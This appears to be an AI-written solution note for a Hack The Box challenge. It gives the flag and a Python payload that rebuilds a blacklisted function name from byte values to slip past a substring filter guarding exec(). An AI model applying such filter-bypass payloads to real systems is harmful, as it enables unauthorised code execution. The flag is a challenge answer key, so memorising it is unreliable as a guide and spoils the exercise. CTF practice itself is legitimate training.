@@ -1,0 +1,10 @@
+Flag: `HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_8d858eb0dc2da48d29891e1bf220cfff}`
+
+Working payload:
+```python
+globals().get(bytes((111,112,101,110,95,99,104,101,115,116)).decode())()
+```
+
+Why it works: [`main.py`](/home/mfekenyuzi/htb/misc/misc_locked_away/challenge/main.py) blacklists the raw substring `open`, but still does `exec(command)`. The payload rebuilds the string `open_chest` from byte values at runtime, fetches that function from `globals()`, and calls it, so the blacklist never sees the forbidden word.
+
+If you want, I can also give you a short reusable solver for similar blacklist-bypass terminal challenges.
